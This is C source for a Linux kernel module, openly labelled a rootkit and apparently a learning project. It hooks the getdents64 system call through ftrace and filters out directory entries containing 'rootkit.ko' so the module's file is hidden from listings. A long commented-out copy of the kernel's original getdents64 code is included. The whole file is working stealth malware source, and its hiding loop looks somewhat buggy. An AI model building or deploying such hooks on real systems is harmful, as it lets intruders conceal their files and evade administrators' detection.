#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <asm/unistd.h>
#include <linux/smp.h>
#include <linux/preempt.h>
#include <linux/vmalloc.h>
#include <linux/ftrace.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/stat.h>

// https://www.intel.com/content/www/us/en/docs/dpcpp-cpp-compiler/developer-guide-reference/2024-1/foptimize-sibling-calls.html
#pragma GCC optimize("-fno-optimize-sibling-calls")

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

static int find_sys_call_addr(struct ftrace_hook *hook) {
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "Failed to find syscall table\n");
        return 1;
    }
    *((unsigned long*) hook->original) = hook->address;
    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if(!within_module(parent_ip, THIS_MODULE))
        ((struct pt_regs *)(regs))->ip = (unsigned long) hook->function;
}

static int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = find_sys_call_addr(hook);
    if(err)
        return err;
    /* For many of function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_INFO "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_INFO "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

static void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

static asmlinkage long (*original_call)(const struct pt_regs *);

// Original getdents64 syscall :
/*
  struct getdents_callback64 {
	  struct dir_context ctx;
  	struct linux_dirent64 __user * current_dir;
	  int prev_reclen;
	  int count;
	  int error;
  };

static int verify_dirent_name(const char *name, int len)
{
	if (len <= 0 || len >= PATH_MAX)
		return -EIO;
	if (memchr(name, '/', len))
		return -EIO;
	return 0;
}

#define unsafe_copy_dirent_name(_dst, _src, _len, label) do {	\
	char __user *dst = (_dst);				\
	const char *src = (_src);				\
	size_t len = (_len);					\
	unsafe_put_user(0, dst+len, label);			\
	unsafe_copy_to_user(dst, src, len, label);		\
} while (0)

static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type)
{
	struct linux_dirent64 __user *dirent, *prev;
	struct getdents_callback64 *buf =
		container_of(ctx, struct getdents_callback64, ctx);
	int reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1,
		sizeof(u64));
	int prev_reclen;

	buf->error = verify_dirent_name(name, namlen);
	if (unlikely(buf->error))
		return false;
	buf->error = -EINVAL;	 only used if we fail.. 
	if (reclen > buf->count)
		return false;
	prev_reclen = buf->prev_reclen;
	if (prev_reclen && signal_pending(current))
		return false;
	dirent = buf->current_dir;
	prev = (void __user *)dirent - prev_reclen;
	if (!user_write_access_begin(prev, reclen + prev_reclen))
		goto efault;

	 This might be 'dirent->d_off', but if so it will get overwritten 
	unsafe_put_user(offset, &prev->d_off, efault_end);
	unsafe_put_user(ino, &dirent->d_ino, efault_end);
	unsafe_put_user(reclen, &dirent->d_reclen, efault_end);
	unsafe_put_user(d_type, &dirent->d_type, efault_end);
	unsafe_copy_dirent_name(dirent->d_name, name, namlen, efault_end);
	user_write_access_end();

	buf->prev_reclen = reclen;
	buf->current_dir = (void __user *)dirent + reclen;
	buf->count -= reclen;
	return true;

efault_end:
	user_write_access_end();
efault:
	buf->error = -EFAULT;
	return false;
}

getdent64 {
	  struct fd f;
	  struct getdents_callback64 buf = {
	  	.ctx.actor = filldir64,
	  	.count = count,
	  	.current_dir = dirent
	  };

	  int error;

	  f = fdget_pos(fd);
	  if (!f.file)
	  	return -EBADF;

	  error = iterate_dir(f.file, &buf.ctx);
	  if (error >= 0)
	  	error = buf.error;
	  if (buf.prev_reclen) {
	  	struct linux_dirent64 __user * lastdirent;
	  	typeof(lastdirent->d_off) d_off = buf.ctx.pos;

	  	lastdirent = (void __user *) buf.current_dir - buf.prev_reclen;
	  	if (put_user(d_off, &lastdirent->d_off))
	  		error = -EFAULT;
	  	else
	  		error = count - buf.count;
	  }
	  fdput_pos(f);
	  return error;
}



*/
/*
 * di -> FD
 * si -> struct dirent
 * dx -> count, taille de buffer %di
*/
static asmlinkage long myGetDents(const struct pt_regs *regs) {

    printk(KERN_INFO "Hello there\n");
    int dirent_idx = 0;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64* dirent_buff;
//   long int          count = regs->dx;
//    long unsigned int fd = regs->di;

    struct linux_dirent64* dirent_buff_prev = NULL;

    int getdent_ret = original_call(regs);

    if (getdent_ret <= 0) {
        return getdent_ret;
    }
    void *dbuf = (void *)(dirent);
  //array of "string to hide"
    int to_hide = 0;

    while (dirent_idx + to_hide < getdent_ret) {
      dirent_buff = (struct linux_dirent64 *)(dbuf + dirent_idx);
//      printk(KERN_INFO "|%i| %i \n", getdent_ret, dirent_buff->d_reclen);
      if (strstr(dirent_buff->d_name, "rootkit.ko") != NULL) {
          to_hide += dirent_buff->d_reclen;
          //Copy 
          memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
      } else {
        dirent_buff_prev = dirent_buff;
        dirent_idx += dirent_buff->d_reclen;
      }

    /*
   printf("%-10s ", (d_type == DT_REG) ?  "regular" :
   (d_type == DT_DIR) ?  "directory" :
   (d_type == DT_FIFO) ? "FIFO" :
   (d_type == DT_SOCK) ? "socket" :
   (d_type == DT_LNK) ?  "symlink" :
   (d_type == DT_BLK) ?  "block dev" :
   (d_type == DT_CHR) ?  "char dev" : "???");
    */
  }
	return dirent_idx - to_hide;
}



static  struct ftrace_hook f_hook = {
    .name = "__x64_sys_getdents64",
    .function = (myGetDents),
    .original = (&original_call),
};

static int __init rootkit_init(void) {
    if (fh_install_hook(&f_hook)) {
      printk(KERN_INFO "Bruh minstall hook eroor\n");
   }
    printk(KERN_INFO "Rootkit has been loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    fh_remove_hook(&f_hook);
    printk(KERN_INFO "Rootkit has been unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
